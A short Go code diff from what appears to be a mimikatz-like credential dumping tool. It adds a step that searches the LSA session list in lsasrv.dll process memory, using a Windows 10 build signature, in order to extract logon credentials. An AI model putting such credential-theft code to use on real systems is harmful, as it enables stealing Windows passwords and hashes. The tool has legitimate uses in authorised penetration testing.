@@ -101,8 +101,12 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	if err != nil {
 		return nil, err
 	}
+
 	for _, module := range modules {
 		if module.name == "lsasrv.dll" {
+			patch := lsaSrvX64References[buildWin10v1507]
+			kiwi.searchSessionList(pHandle, patch)
+
 			_ = kiwi.searchMemory(pHandle, module.address, module.size)
 		}
 		// fmt.Println(module.name, module.address)
